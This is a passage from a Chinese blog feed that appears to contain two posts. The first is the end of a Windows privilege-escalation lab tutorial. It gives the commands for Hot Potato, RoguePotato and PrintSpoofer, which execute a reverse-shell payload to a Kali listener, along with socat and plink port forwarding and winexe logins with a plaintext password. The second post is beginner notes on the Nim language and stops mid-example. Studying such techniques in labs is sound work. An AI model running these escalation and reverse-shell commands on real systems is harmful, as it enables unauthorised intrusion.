title="4.使用cscript运行脚本"></a>4.使用cscript运行脚本</h3><pre class="line-numbers language-none"><code class="language-none">cscript CreateShortcut.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-进行反弹shell"><a href="#5-进行反弹shell" class="headerlink" title="5.进行反弹shell"></a>5.进行反弹shell</h3><h1 id="已安装的应用程序"><a href="#已安装的应用程序" class="headerlink" title="已安装的应用程序"></a>已安装的应用程序</h1><h2 id="前言-18"><a href="#前言-18" class="headerlink" title="前言"></a>前言</h2><p>与已安装应用程序相关的大多数权限升级都基于我们已经涵盖的错误的配置。</p><p>不过，一些权限升级是缓冲区溢出等结果，因此知道如何识别已安装的应用程序和已知漏洞仍然很重要</p><h2 id="基本命令-2"><a href="#基本命令-2" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="手动列举所有运行程序："><a href="#手动列举所有运行程序：" class="headerlink" title="手动列举所有运行程序："></a>手动列举所有运行程序：</h3><pre class="line-numbers language-none"><code class="language-none">tasklist /v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="我们还可以使用Seatbelt搜索非标准流程："><a href="#我们还可以使用Seatbelt搜索非标准流程：" class="headerlink" title="我们还可以使用Seatbelt搜索非标准流程："></a>我们还可以使用Seatbelt搜索非标准流程：</h3><pre class="line-numbers language-none"><code class="language-none">.\seatbelt.exe NonstandardProcesses<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104749.png" alt="image-20210723101152597"></p><h3 id="winPEASany也可以"><a href="#winPEASany也可以" class="headerlink" title="winPEASany也可以"></a>winPEASany也可以</h3><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet procesinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104750.png" alt="image-20210723101217321"></p><h1 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h1><h2 id="前言-19"><a href="#前言-19" class="headerlink" title="前言"></a>前言</h2><p>Hot Potato是使用欺骗攻击的攻击的名称</p><p>同时进行NTLM中继攻击以获得系统权限。</p><p>该攻击诱使Windows作为系统进行身份验证</p><p>用户使用NTLM访问一个假的HTTP服务器。NTLM凭据</p><p>然后NTLM凭据将其转告到SMB以获得命令执行。</p><h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><p>此攻击适用于Windows 7、8和早期版本的Windows 10</p><h2 id="实操-win7"><a href="#实操-win7" class="headerlink" title="实操(win7)"></a>实操(win7)</h2><h3 id="1-将potato-exe复制到Windows上"><a href="#1-将potato-exe复制到Windows上" class="headerlink" title="1.将potato.exe复制到Windows上."></a>1.将potato.exe复制到Windows上.</h3><h3 id="2-开启kali的监听"><a href="#2-开启kali的监听" class="headerlink" title="2.开启kali的监听"></a>2.开启kali的监听</h3><h3 id="3-运行exp"><a href="#3-运行exp" class="headerlink" title="3.运行exp"></a>3.运行exp</h3><pre class="line-numbers language-none"><code class="language-none">.\potato.exe -ip 192.168.175.228 -cmd "C:\Users\user\Desktop\a002.exe" - enable_httpserver true -enable_defender true -enable_spoof true - enable_exhaust true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-等待Windows-Defender更新，或手动触发更新"><a href="#4-等待Windows-Defender更新，或手动触发更新" class="headerlink" title="4. 等待Windows Defender更新，或手动触发更新"></a>4. 等待Windows Defender更新，或手动触发更新</h3><h1 id="令牌模拟"><a href="#令牌模拟" class="headerlink" title="令牌模拟"></a>令牌模拟</h1><h2 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h2><p>可以为服务帐户授予特权，但是无法直接登录。</p><p>在服务中发现问题帐户，使其更易于升级权限。</p><h2 id="Rotten-Potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a>Rotten Potato</h2><p>服务帐户可以拦截系统票证并使用它模拟系统用户</p><p>因为服务帐户通常具有<code>SeImpersonatePrivilege</code>特权已启用。</p><h2 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate / SeAssignPrimaryToken"></a>SeImpersonate / SeAssignPrimaryToken</h2><p>服务帐户通常配置这两个特权。</p><p>它们允许帐户模拟其他用户（包括系统用户）。</p><p>具有这些权限的任何用户都可以运行令牌</p><h2 id="Juicy-Potato-烂土豆"><a href="#Juicy-Potato-烂土豆" class="headerlink" title="Juicy Potato(烂土豆)"></a>Juicy Potato(烂土豆)</h2><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p>这里就不细写了 用的太多了</p><h2 id="Rogue-Potato"><a href="#Rogue-Potato" class="headerlink" title="Rogue Potato"></a>Rogue Potato</h2><p>GitHub: <a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a> </p><p>Blog: <a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato">https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato</a></p><p>Compiled Exploit:  <a href="https://github.com/antonioCoco/RoguePotato/releases">https://github.com/antonioCoco/RoguePotato/releases</a></p><h3 id="实操-14"><a href="#实操-14" class="headerlink" title="实操"></a>实操</h3><h4 id="1-复制PSExec64-exe和RoguePotato-exe到Windows上"><a href="#1-复制PSExec64-exe和RoguePotato-exe到Windows上" class="headerlink" title="1.复制PSExec64.exe和RoguePotato.exe到Windows上"></a>1.复制PSExec64.exe和RoguePotato.exe到Windows上</h4><h4 id="2-在Kali上设置socat重定向器，进行端口转发"><a href="#2-在Kali上设置socat重定向器，进行端口转发" class="headerlink" title="2. 在Kali上设置socat重定向器，进行端口转发"></a>2. 在Kali上设置socat重定向器，进行端口转发</h4><pre class="line-numbers language-none"><code class="language-none">sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.175.228:9999192.168.175.228：是靶机的IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-kali开启监听"><a href="#3-kali开启监听" class="headerlink" title="3.kali开启监听"></a>3.kali开启监听</h4><h4 id="4-使用管理员命令提示，使用-PSExec64-exe-触发作为本地服务帐户运行的反向外壳："><a href="#4-使用管理员命令提示，使用-PSExec64-exe-触发作为本地服务帐户运行的反向外壳：" class="headerlink" title="4. 使用管理员命令提示，使用 PSExec64.exe 触发作为本地服务帐户运行的反向外壳："></a>4. 使用管理员命令提示，使用 PSExec64.exe 触发作为本地服务帐户运行的反向外壳：</h4><pre class="line-numbers language-none"><code class="language-none">C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\Users\user\Desktop\a002.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-kali开启另一个监听"><a href="#5-kali开启另一个监听" class="headerlink" title="5. kali开启另一个监听"></a>5. kali开启另一个监听</h4><h3 id="6-现在运行RoguePotato-exe漏洞触发进行反弹shell"><a href="#6-现在运行RoguePotato-exe漏洞触发进行反弹shell" class="headerlink" title="6.现在运行RoguePotato.exe漏洞触发进行反弹shell"></a>6.现在运行RoguePotato.exe漏洞触发进行反弹shell</h3><pre class="line-numbers language-none"><code class="language-none">C:\PrivEsc\RoguePotato.exe -r 192.168.175.130 –l  9999 -e "C:\Users\user\Desktop\a002.exe"192.168.175.130：是kali的IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h2><h3 id="前言-20"><a href="#前言-20" class="headerlink" title="前言"></a>前言</h3><p>PrintSpoofer是一种针对打印后台处理程序服务的攻击</p><p>GitHub: <a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a> </p><p>Blog: <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges</a></p><p>最新的打印机漏洞：<a href="https://www.4hou.com/posts/4VB6">https://www.4hou.com/posts/4VB6</a></p><h3 id="实操-15"><a href="#实操-15" class="headerlink" title="实操"></a>实操</h3><h4 id="1-复制PSExec64-exe和PrintSpoofer-exe可执行到Windows上"><a href="#1-复制PSExec64-exe和PrintSpoofer-exe可执行到Windows上" class="headerlink" title="1. 复制PSExec64.exe和PrintSpoofer.exe可执行到Windows上"></a>1. 复制PSExec64.exe和PrintSpoofer.exe可执行到Windows上</h4><h4 id="2-在kali开启监听"><a href="#2-在kali开启监听" class="headerlink" title="2. 在kali开启监听"></a>2. 在kali开启监听</h4><h4 id="3-使用管理员命令提示，使用-PSExec64-exe触发作为本地服务帐户运行的反向外壳："><a href="#3-使用管理员命令提示，使用-PSExec64-exe触发作为本地服务帐户运行的反向外壳：" class="headerlink" title="3. 使用管理员命令提示，使用 PSExec64.exe触发作为本地服务帐户运行的反向外壳："></a>3. 使用管理员命令提示，使用 PSExec64.exe触发作为本地服务帐户运行的反向外壳：</h4><pre class="line-numbers language-none"><code class="language-none">C:\PrivEsc\PSExec64.exe /accepteula -i -u  "nt authority\local service"  C:\Users\user\Desktop\a002.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-在kali开启另一个监听"><a href="#4-在kali开启另一个监听" class="headerlink" title="4. 在kali开启另一个监听"></a>4. 在kali开启另一个监听</h4><h4 id="5-现在运行打印应用漏洞，以触发具有系统权限的反向外壳运行："><a href="#5-现在运行打印应用漏洞，以触发具有系统权限的反向外壳运行：" class="headerlink" title="5.现在运行打印应用漏洞，以触发具有系统权限的反向外壳运行："></a>5.现在运行打印应用漏洞，以触发具有系统权限的反向外壳运行：</h4><pre class="line-numbers language-none"><code class="language-none">C:\PrivEsc\PrintSpoofer.exe –i - c "C:\Users\user\Desktop\a002.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="前言-21"><a href="#前言-21" class="headerlink" title="前言"></a>前言</h2><p>有时在 Kali 上运行漏洞代码更容易，但易受攻击的程序是在内部端口上收听</p><p>在这些情况下 ，我们需要将kali端口转发到 Windows 上的内部端口</p><p>我们可以使用 <code>plink.exe</code>来自Putty 的makers来做到这一点</p><h2 id="plink-exe"><a href="#plink-exe" class="headerlink" title="plink.exe"></a>plink.exe</h2><h3 id="plink-exe的端口转发命令的一般格式"><a href="#plink-exe的端口转发命令的一般格式" class="headerlink" title="plink.exe的端口转发命令的一般格式"></a>plink.exe的端口转发命令的一般格式</h3><pre class="line-numbers language-none"><code class="language-none">plink.exe &lt;user&gt;@&lt;kali&gt; -R &lt;kaliport&gt;:&lt;target-IP&gt;:&lt;target-port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&lt;目标-IP&gt;通常是本地的(例如 127.0.0.1)</p><p>plink.exe要求您将SSH转到kali，然后使用SSH隧道转发端口。</p><h3 id="实操-16"><a href="#实操-16" class="headerlink" title="实操"></a>实操</h3><h4 id="1-使用winexe远程登录"><a href="#1-使用winexe远程登录" class="headerlink" title="1.使用winexe远程登录"></a>1.使用winexe远程登录</h4><pre class="line-numbers language-none"><code class="language-none">winexe -U 'admin%password123'  //192.168.175.228 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-使用管理员命令提示，-重新启用-防火墙："><a href="#2-使用管理员命令提示，-重新启用-防火墙：" class="headerlink" title="2. 使用管理员命令提示， 重新启用 防火墙："></a>2. 使用管理员命令提示， 重新启用 防火墙：</h4><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set allprofiles state on<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-确认winexe命令现在已失效。"><a href="#3-确认winexe命令现在已失效。" class="headerlink" title="3. 确认winexe命令现在已失效。"></a>3. 确认winexe命令现在已失效。</h4><h4 id="4-将plink-exe文件复制到-Windows，然后在-Kali上kill掉SMB-服务器"><a href="#4-将plink-exe文件复制到-Windows，然后在-Kali上kill掉SMB-服务器" class="headerlink" title="4.将plink .exe文件复制到 Windows，然后在 Kali上kill掉SMB 服务器"></a>4.将plink .exe文件复制到 Windows，然后在 Kali上kill掉SMB 服务器</h4><h4 id="5-确保Kali上的-SSH-服务器正在运行并接受root登录。"><a href="#5-确保Kali上的-SSH-服务器正在运行并接受root登录。" class="headerlink" title="5. 确保Kali上的 SSH 服务器正在运行并接受root登录。"></a>5. 确保Kali上的 SSH 服务器正在运行并接受root登录。</h4><p>检查<code>/etc/ssh/sshd_config</code>中未注释<code>PermitRootLogin yes</code>选项。</p><p>如有必要，请重新启动 SSH 服务。</p><h4 id="6-在-Windows-上，使用-plink-exe将-Kali-上的端口-445-转发到Windows端口-445："><a href="#6-在-Windows-上，使用-plink-exe将-Kali-上的端口-445-转发到Windows端口-445：" class="headerlink" title="6. 在 Windows 上，使用 plink.exe将 Kali 上的端口 445 转发到Windows端口 445："></a>6. 在 Windows 上，使用 plink.exe将 Kali 上的端口 445 转发到Windows端口 445：</h4><pre class="line-numbers language-none"><code class="language-none">plink.exe root@192.168.175.130 -R 445:127.0.0.1:445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>####在 Kali 上，修改winexe 命令以指向本地托架（或 127.0.0.1），然后执行该命令以通过端口向前获取</p><pre class="line-numbers language-none"><code class="language-none">winexe -U 'admin%password123' //localhost cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="getsystem-命名管道和令牌复制）"><a href="#getsystem-命名管道和令牌复制）" class="headerlink" title="getsystem(命名管道和令牌复制）"></a>getsystem(命名管道和令牌复制）</h1><h2 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h2><p>访问令牌是Windows中存储用户权限的特殊对象身份和特权。</p><p>主访问令牌–在用户登录时创建，绑定到当前用户会话。</p><p>当用户启动一个新进程时，他们的主进程访问令牌被复制并附加到新进程。</p><p>模拟访问令牌–在进程或线程需要时创建临时与另一个用户的安全上下文一起运行。</p><h2 id="令牌复制"><a href="#令牌复制" class="headerlink" title="令牌复制"></a>令牌复制</h2><p> Windows允许 processes/threads复制它们的访问令牌。 </p><p> 模拟访问令牌可以这样复制到主访问令牌中。 </p><p> 如果我们可以注入一个进程，我们就可以使用这个功能 复制进程的访问令牌，并生成具有相同权限的独立进程</p><p>您可能已经熟悉 Windows 和 Linux 中的”管道”概念：</p><h2 id="命令管道"><a href="#命令管道" class="headerlink" title="命令管道"></a>命令管道</h2><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr Windows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进程可以创建命名管道，其他进程可以打开命名管道从中读取或写入数据的管道。</p><p>创建命名管道的进程可以模拟安全上下文连接到命名管道的进程的。</p><h2 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h2><p>msf中的getsystem很神奇 可能会直接提到system权限</p><h1 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h1><h2 id="前言-22"><a href="#前言-22" class="headerlink" title="前言"></a>前言</h2><p> 在Windows中，可以为用户帐户和组分配特定的“特权”。 </p><p> 这些特权授予对某些能力的访问权。其中一些能力可以用来将我们的总体特权提升到系统的权限。 </p><h2 id="列出用户权限"><a href="#列出用户权限" class="headerlink" title="列出用户权限"></a>列出用户权限</h2><pre class="line-numbers language-none"><code class="language-none">whoami /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h2><p>可以使用烂土豆</p><h2 id="SeAssignPrimaryPrivilege"><a href="#SeAssignPrimaryPrivilege" class="headerlink" title="SeAssignPrimaryPrivilege"></a>SeAssignPrimaryPrivilege</h2><p>可以使用烂土豆</p><h2 id="SeAssignPrimaryPrivilege-1"><a href="#SeAssignPrimaryPrivilege-1" class="headerlink" title="SeAssignPrimaryPrivilege"></a>SeAssignPrimaryPrivilege</h2><p>可以使用烂土豆</p><h2 id="SeBackupPrivilege"><a href="#SeBackupPrivilege" class="headerlink" title="SeBackupPrivilege"></a>SeBackupPrivilege</h2><p>授予对所有对象的读取权限</p><p>在系统上，不管他们的ACL使用此权限，用户可以访问敏感的或者从注册表中提取哈希值</p><p>然后进行破解或用于传递散列攻击。</p><h2 id="SeRestorePrivilege"><a href="#SeRestorePrivilege" class="headerlink" title="SeRestorePrivilege"></a>SeRestorePrivilege</h2><p>SeRestorePrivilege授予对系统上所有对象的写访问权，而不管它们的ACL如何。</p><p>滥用特权的三种方式：</p><ul><li><p>修改服务二进制文件</p></li><li><p>覆盖系统进程使用的DLL</p></li><li><p>修改注册表设置</p></li></ul><h2 id="SeTakeOwnershipPrivilege"><a href="#SeTakeOwnershipPrivilege" class="headerlink" title="SeTakeOwnershipPrivilege"></a>SeTakeOwnershipPrivilege</h2><p>SeTakeOwnershipPrivilege允许用户取得所有权，在对象上（写入所有者权限）</p><p>一旦您拥有一个对象，就可以修改它的ACL并授予你自己写访问权限</p><p>与SeRestorePrivilege使用的方法相同</p><h2 id="其他特权-更高级"><a href="#其他特权-更高级" class="headerlink" title="其他特权(更高级)"></a>其他特权(更高级)</h2><ul><li><p>SeTcbPrivilege </p></li><li><p>SeCreateTokenPrivilege </p></li><li><p>SeLoadDriverPrivilege </p></li><li><p>SeDebugPrivilege (used by getsystem)</p></li></ul><h1 id="权限提升策略"><a href="#权限提升策略" class="headerlink" title="权限提升策略"></a>权限提升策略</h1><p>1.检查用户(whoami)和组(<code>net user&lt;username&gt;</code>)</p><p>2.运行winPEAS</p><p>3.同时运行安全带和其他脚本！</p><p>最后给大家留一个备忘录：</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a></p><p><strong>最后请大家谨记网络安全法，遵纪守法，不要擅自做违法的事情，后果自负！</strong></p><p>希望此文对大家有帮助！</p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows提权小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nim学习</title>
      <link href="/2021/10/28/nim-xue-xi/"/>
      <url>/2021/10/28/nim-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="默认使用compile-使用c语言的语法去编译"><a href="#默认使用compile-使用c语言的语法去编译" class="headerlink" title="默认使用compile  使用c语言的语法去编译"></a>默认使用compile  使用c语言的语法去编译</h2><pre class="line-numbers language-none"><code class="language-none">nim --fullhelp 完整性帮助cccppobjcjs-d:debug(默认)-d:release-d:mingwnim c -d:release a.nimpowershell下:nim c -d=release a.nim--opt=none  优化选项--opt=speed(speed)--opt=size--passC 表示传给c编译器的选项 --passC=flto--passL:表示给链接器的选项--passL=flto一个可执行文件的生成需要两部分一部(编译):将源码编译成二进制代码二部(链接):将它需要的库,外部的东西链接起来-r 编译完就运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>nim-lang.org</p><p>Scoop 安装即可</p><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><p>函数 叫过程</p><p>procedur</p><p>取前四个字母</p><p>proc</p><pre class="line-numbers language-none"><code class="language-none">三种返回结果的方式一:proc aaa(s,name:string; age:int):string = s &amp; name $age函数会以最后一句作为返回值即s &amp; name 就是返回值 二:proc aaa(s,name:string; age:int):string = return s &amp; name $age三:也可以使用resultproc aaa(s,name:string; age:int):string = result = s &amp; name $age也可以匿名 就是不要aaavar proc(s,name:string; age:int):string = result = s &amp; name $age<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一个插件推荐"><a href="#一个插件推荐" class="headerlink" title="一个插件推荐"></a>一个插件推荐</h2><p>indent-rainbow</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre class="line-numbers language-none"><code class="language-none">单行注释:#多行注释:#[***]#discard"""***"""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="堆定义"><a href="#堆定义" class="headerlink" title="堆定义"></a>堆定义</h2><pre class="line-numbers language-none"><code class="language-none">var name:string = "hello"直接赋值的时候 编译器会进行类型推导var name = "***"多个堆定义vars:stringa:int<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="let"><a href="#let" class="headerlink" title="let"></a>let</h2><p>和var相似</p><pre class="line-numbers language-none"><code class="language-none">let name:string = "hello"定义之后的 name的值就不能改了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="常量定义"><a href="#常量定义" class="headerlink" title="常量定义"></a>常量定义</h2><pre class="line-numbers language-none"><code class="language-none">constNAME = "张三"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><pre class="line-numbers language-none"><code class="language-none">echo ("helloworld",aaa)带括号 或者不带括号都行的还可以指定类型比如指定int的int8类型echo "helloworld", 11'i8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>教程</p><p><img src="1.assets/image-20210926092434342.png" alt="image-20210926092434342"></p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><pre class="line-numbers language-none"><code class="language-none">var arr:seq[byte] = @[byte 0x01, 0x02]或者var arr:seq[byte] = @[0x01'u8, 0x02]意思都是 原先的0x01, 0x02 int类型指定为byte类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><pre class="line-numbers language-none"><code class="language-none">if a&gt;b:***elif a&gt;c:***else:***<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="case语句"><a href="#case语句" class="headerlink" title="case语句"></a>case语句</h2><pre class="line-numbers language-none"><code class="language-none">var name:stingcase nameof "":***of "aaa","bbb":***else:***<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h2><pre class="line-numbers language-none"><code class="language-none">for i in 0..10:echo i输出的就是012345678910for i in [1, 2, 3]:echo i输出的就是123相当于一个迭代器for i,v in [1, 2, 3]echo  i, "-", v输出的就是0-11-22-3但是这时候 i是它的一个索引,索引从0开始v才是值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="when"><a href="#when" class="headerlink" title="when"></a>when</h2><pre class="line-numbers language-none"><code class="language-none">when system.hostOS == "windows":echo "编译进去"else***when有一点不同的就是如果系统不是windows  那么这串代码  将不会被编译到exe可执行文件中简单理解 就是在编译时判断像if就是在exe文件中判断<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>还需要看官网文档</p><pre class="line-numbers language-none"><code class="language-none">iteratoriterator countStars(a,b:int):int = var res = awhile res &lt;= b yiled resinc (res)这里注意 进来之后 要先var定义一下 才可以因为a是形参for x in countStars(1, 10)echo x <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="type定义新类型"><a href="#type定义新类型" class="headerlink" title="type定义新类型"></a>type定义新类型</h2><pre class="line-numbers language-none"><code class="language-none">type MyIterator = iterator():int<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>闭包{.closure.}</p><p>函数体内 访问函数体外的变量</p><pre class="line-numbers language-none"><code class="language-none">type MyIterator = iterator():intproc genCountStars( start:int):MyIterator =var loc = startreturn iterator():int{.closure.} = while loc &lt; 10:yield locinc(loc)var iter = genCountStars(5)for x in iter():echo x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="把符号名定义为函数名"><a href="#把符号名定义为函数名" class="headerlink" title="`把符号名定义为函数名"></a>`把符号名定义为函数名</h2><pre class="line-numbers language-none"><code class="language-none">proc `++`比如输出10个等号一:import strutilsecho "=".repeat(10)二:定义一个符号函数体比如定义一个*的函数体import strutilsproc `*`(s:string, a:int):string = s.repeat(a)echo "=" * 20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="iterator也可以定义符号"><a href="#iterator也可以定义符号" class="headerlink" title="iterator也可以定义符号"></a>iterator也可以定义符号</h2><p><img src="1.assets/image-20210926101001881.png" alt="image-20210926101001881"></p><pre class="line-numbers language-none"><code class="language-none">iterator `...` (a,b:int):int = var t = awhile t &lt;= byield tinc(t)for x in 5...10echo x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="proc值修改"><a href="#proc值修改" class="headerlink" title="proc值修改"></a>proc值修改</h2><pre class="line-numbers language-none"><code class="language-none">var msg = "hello"proc myfunc(s:var string) = result = msgmyfunc() = "hi"echo msg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个参数可以拿出函数体外</p><pre class="line-numbers language-none"><code class="language-none">proc addString(a,b:string):string = a &amp; becho addString("hello ", "world")那么当第一个参数拿出函数体外时就变成了这样echo "hello".addString("world")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>连续调用</p><pre class="line-numbers language-none"><code class="language-none">proc printMsg(a:string):string =echo areturn "hello world" &amp; adiscard msg.printMsg.print.Msg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="discard忽略返回值"><a href="#discard忽略返回值" class="headerlink" title="discard忽略返回值"></a>discard忽略返回值</h2><h2 id="type定义枚举类型enum"><a href="#type定义枚举类型enum" class="headerlink" title="type定义枚举类型enum"></a>type定义枚举类型enum</h2><pre class="line-numbers language-none"><code class="language-none">type MyEnum = enumnorth, south, east, westvar a : MyEnum = north这里 north, south, east, west 默认是0, 1, 2, 3当然可以跳跃指定比如north = 2, south, east, west那么这里north, south, east, west 默认是2, 3, 4, 5那么不想被带到全局里 的时候 就要这么写不会污染全局type MyEnum {.pure.} = enumnorth, south, east, westvar a : MyEnum = MyEnum.north输出一下echo MyEnum.north输出一下值echo ord(MyEnum.north)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="type定义子键类型range"><a href="#type定义子键类型range" class="headerlink" title="type定义子键类型range"></a>type定义子键类型range</h2><pre class="line-numbers language-none"><code class="language-none">type MySubRange = range[0..10]输出一下echo high(MySubRange)echo low(MySubRange)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="type定义集合类型set"><a href="#type定义集合类型set" class="headerlink" title="type定义集合类型set"></a>type定义集合类型set</h2><pre class="line-numbers language-none"><code class="language-none">typeMySet = set[int8]var a:MySet = {1'i8, 2'i8, 3'i8}var b:MySet = {4'i8, 5'i8, 6'i8}输出一下 并集echo a + b交集x * y差集x - y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="type定义数组类型array-固定数组"><a href="#type定义数组类型array-固定数组" class="headerlink" title="type定义数组类型array(固定数组)"></a>type定义数组类型array(固定数组)</h2><pre class="line-numbers language-none"><code class="language-none">type MyArray = array[10, int]10是数组的大小 也可以放子键var array:MyArray[1, 2, 3]echo array访问某一个下标的值echo array[1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><pre class="line-numbers language-none"><code class="language-none">type MyTwoDArray = array[3, array[2, int]]行3列2 int类型var 